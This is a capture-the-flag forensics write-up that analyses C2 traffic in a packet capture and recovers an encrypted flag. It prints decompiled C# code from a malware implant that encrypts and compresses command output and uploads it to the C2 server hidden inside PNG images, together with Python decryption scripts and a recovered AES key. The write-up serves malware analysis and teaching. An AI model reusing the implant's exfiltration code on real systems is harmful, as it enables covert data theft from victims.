---
layout: load_md
title: The White Circle | Cyber Apocalypse 2023 | Interstellar C2 Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2023
parent: cyber_apocalypse_2023
category: forensics
challenge: Interstellar C2
tags: "forensics, twh, c2, powershell, malware, aes, encryption, python"
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2023</h1>
## Interstellar C2
> Solved by : thewhiteh4t


- Challenge begins with a PCAPNG file with about 8K packets containing c2 traffic
- After some poking around it was clear that this c2 was using HTTP protocol
- Working in the order of packets first packet contains a request for a powershell script 


![](https://i.imgur.com/DjG949Z.png)

![](https://i.imgur.com/pAy9irJ.png)

- It was slightly obfuscated so I used PSDecode, after decoding :


![](https://i.imgur.com/NfeN2tN.png)

- It fetches an encrypted blob from the c2 server using BitsTransfer
- Decrypts using hardcoded key and iv and stores it as an `exe` file
- This request in wireshark :


![](https://i.imgur.com/8t3yrfz.png)

- By modifying the ps1 script I got the exe file :


![](https://i.imgur.com/SX98LyR.png)

![](https://i.imgur.com/XvXfIcJ.png)

- De-compiling the exe was very easy because it was written in c#


![](https://i.imgur.com/IcdsYZl.png)

- This exe file turns out to be an implant used by the c2
- Now the first get request after ps1 script download is made by this implant :


![](https://i.imgur.com/tWPoeDK.png)

- This turns out to be another encrypted blob, this url query is hardcoded in the source code :


![](https://i.imgur.com/EH50lxy.png)

- The key for AES is also hardcoded
- Lets look at the encryption function of the implant :

```c#
private static string Encryption(string key, string un, bool comp = false, byte[] unByte = null)
    {
        byte[] array = null;
        array = (byte[])((unByte == null) ? ((object)Encoding.UTF8.GetBytes(un)) : ((object)unByte));
        if (comp)
        {
            array = Compress(array);
        }
        try
        {
            SymmetricAlgorithm val = CreateCam(key, null);
            byte[] second = val.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
            return Convert.ToBase64String(Combine(val.get_IV(), second));
        }
        catch
        {
            SymmetricAlgorithm val2 = CreateCam(key, null, rij: false);
            byte[] second2 = val2.CreateEncryptor().TransformFinalBlock(array, 0, array.Length);
            return Convert.ToBase64String(Combine(val2.get_IV(), second2));
        }
    }
```

- Standard AES encryption, but the value of IV is not hardcoded, this was very interesting because all of the implant traffic is encrypted
- we can assume that the server has the key, but if we look at the encryption function the iv is generated on the victim machine by the implant, so server does not have the IV
- so how is the server decrypting requests ? I kept looking in the code and pcap for hours but I could not find it
- finally when i looked at everything I had, the URL was the only plain text data being sent to the server! So I tried to use part of the hardcoded URL as the IV :


![](https://i.imgur.com/8PnooaA.png)

- and it works! I got another base64 block, after decrypting that :


![](https://i.imgur.com/Ct3Opf2.png)

- First line contains the random URI value which we can see in the pcap
- After that there is a large array which contains more URLs similar to the hardcoded one
- Similarly it also contains base64 for PNG images and other juicy stuff
- Server sends a new key for AES encryption : 

```
nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=
```

What is going on ?


- The implant makes a GET request to the c2 server to grab URLs, images and keys
- Then when any command is issued from the c2 server the implant uses that key to encrypt the command output and uses PNGs to send results to the server
- We will see this in detail from this point


![](https://i.imgur.com/nnxGncE.png)

- Second GET query and another encrypted blob
- Simple script for decrypting AES :

```python
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
iv = b'Kettie/Emmie/Ann'
with open('../second_get.data', 'rb') as cipherfile:
    ctext = cipherfile.read()
ciphertext = b64decode(ctext)
key = b64decode('nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=')
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(pad(ciphertext, 128))
stuff = decrypted[16:].split(b'\x00')[0]
plaintext = b64decode(stuff).decode()
print(plaintext)
```

output :


- At the very start we can see the `multicmd loadmodule`  command, these are found in the implant source code


![](https://i.imgur.com/51X7ELz.png)



- this is followed by another blob and ends with :


![](https://i.imgur.com/g6Me7hN.png)

- The blob turned out to be a SharpSploit DLL
- Moving forward we get our first POST query which is uploading first PNG to the c2 server :


![](https://i.imgur.com/q2V9nvk.png)

- Notice `Malformed` , lets go back to the source : 

```c#
public static void Exec(string cmd, string taskId, string key = null, byte[] encByte = null)
    {
        if (string.IsNullOrEmpty(key))
        {
            key = pKey;
        }
        string cookie = Encryption(key, taskId);
        string text = "";
        text = ((encByte == null) ? Encryption(key, cmd, comp: true) : Encryption(key, null, comp: true, encByte));
        byte[] cmdoutput = Convert.FromBase64String(text);
        byte[] imgData = ImgGen.GetImgData(cmdoutput);
        int num = 0;
        while (num < 5)
        {
            num++;
            try
            {
                GetWebRequest(cookie).UploadData(UrlGen.GenerateUrl(), imgData);
                num = 5;
            }
            catch
            {
            }
        }
    }
```

- Exec function is responsible for handling command output and PNG uploading
- First it creates an encrypted cookie which contains task ID
- Then it encrypts the command output
- Decodes the base64 cipher string and calls `ImgGen` function
- Then it runs a loop to upload the PNG, if any error occurs then the loop increments and upload is re attempted until file is uploaded perfectly
- Now lets look into `ImgGen` :

```c#
internal static class ImgGen
    {
        private static Random _rnd = new Random();
        private static Regex _re = new Regex("(?<=\")[^\"]*(?=\")|[^\" ]+", (RegexOptions)8);
        private static List<string> _newImgs = new List<string>();
        internal static void Init(string stringIMGS)
        {
            IEnumerable<string> enumerable = Enumerable.Select<Match, string>(Enumerable.Cast<Match>((IEnumerable)_re.Matches(stringIMGS.Replace(",", ""))), (Func<Match, string>)((Match m) => ((Capture)m).get_Value()));
            enumerable = Enumerable.Where<string>(enumerable, (Func<string, bool>)((string m) => !string.IsNullOrEmpty(m)));
            _newImgs = Enumerable.ToList<string>(enumerable);
        }
        private static string RandomString(int length)
        {
            return new string(Enumerable.ToArray<char>(Enumerable.Select<string, char>(Enumerable.Repeat<string>("...................@..........................Tyscf", length), (Func<string, char>)((string s) => s[_rnd.Next(s.Length)]))));r
        }
        internal static byte[] GetImgData(byte[] cmdoutput)
        {
            int num = 1500;
            int num2 = cmdoutput.Length + num;
            string s = _newImgs[new Random().Next(0, _newImgs.Count)];
            byte[] array = Convert.FromBase64String(s);
            byte[] bytes = Encoding.UTF8.GetBytes(RandomString(num - array.Length));
            byte[] array2 = new byte[num2];
            Array.Copy(array, 0, array2, 0, array.Length);
            Array.Copy(bytes, 0, array2, array.Length, bytes.Length);
            Array.Copy(cmdoutput, 0, array2, array.Length + bytes.Length, cmdoutput.Length);
            return array2;
        }
    }
```

- This function gets a random PNG out of the array it fetched from the c2 server
- Then it proceeds to build the PNG file
- First the PNG data
- Second, it generates a random string based on `...................@..........................Tyscf` charset
- Third, it adds the encrypted command output
- Finally it concatenates all three parts and returns a malicious PNG
- Based on this information we can isolate the command output section in the PNGs
- Implant makes 6 POST requests i.e. 6 attempts at uploading a perfect PNG :


![](https://i.imgur.com/hJfPvQT.png)


First PNG :


![](https://i.imgur.com/0S1ga9W.png)

- The three parts are clearly visible, actual PNG finishes at `IEND` followed by random string and a small encrypted command output
- But the implant made 6 requests, I tried to decrypt the data of each PNG but it did not work

One tiny detail


- Going back to `Encryption` function, it contains a block :

```
if (comp)
        {
            array = Compress(array);
        }
```

- and in `Exec` where `Encryption` is called we have :

```
text = ((encByte == null) ? Encryption(key, cmd, comp: true) : Encryption(key, null, comp: true, encByte));
```

- `comp` is set to `True` which means the encrypted command output is first compressed and then added to the PNG!
- Compression function : 

```c#
private static byte[] Compress(byte[] raw)
    {
        //IL_0009: Unknown result type (might be due to invalid IL or missing references)
        //IL_000f: Expected O, but got Unknown
        using MemoryStream memoryStream = new MemoryStream();
        GZipStream val = new GZipStream((Stream)memoryStream, (CompressionMode)1, true);
        try
        {
            ((Stream)(object)val).Write(raw, 0, raw.Length);
        }
        finally
        {
            ((IDisposable)val)?.Dispose();
        }
        return memoryStream.ToArray();
    }
```

- GZip compression is used to compress the encrypted command output
- Going back to wireshark, the sixth, last PNG is largest in size and I assumed that first 5 requests failed to upload a perfect PNG and the next sixth request succeeded
- Isolating command output :


![](https://i.imgur.com/vTEVfWp.png)

- Start is set to 1500 following the `ImgGen` code which uses a fixed size of 1500, PNG data and random string is isolated and we are left with compressed encrypted command output
- I made modifications in my decryption script to de-compress the encrypted data before attempting decryption :

```python
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import zlib
iv = b'Kettie/Emmie/Ann'
with open('../sixth_png.data', 'rb') as cipherfile:
    ctext = cipherfile.read()
ciphertext = ctext
key = b64decode('nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=')
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(pad(ciphertext, 128))
enc_text = zlib.decompress(decrypted[16:], 15+32)
dec_enc_text = b64decode(enc_text)
with open('flag', 'wb') as out:
    out.write(dec_enc_text)
```


![](https://i.imgur.com/ygvOj8V.png)


And I got the flag! look at top right


![](https://i.imgur.com/10zcW6i.png)

